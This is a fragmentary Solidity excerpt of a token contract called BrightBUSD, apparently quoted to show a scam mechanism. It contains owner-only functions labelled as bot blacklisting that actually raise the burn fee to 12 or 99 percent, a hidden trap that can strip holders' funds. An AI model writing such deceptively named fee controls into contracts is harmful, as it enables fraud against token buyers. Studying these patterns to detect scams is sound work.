...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function decimals() public view virtual returns (uint8) {
     ...
     function BlacklistBotWallet1() external onlyOwner(){
         _feeBurn = 12;     
         
     }
     function BlacklistBotWallet2() external onlyOwner(){
         _feeBurn = 99; 
...
contract  BrightBUSD is ERC200 {

    uint tokenTotalSupply = 1000000000000000;

    constructor() public ERC200("BrightBUSD", "BrightBUSD") {
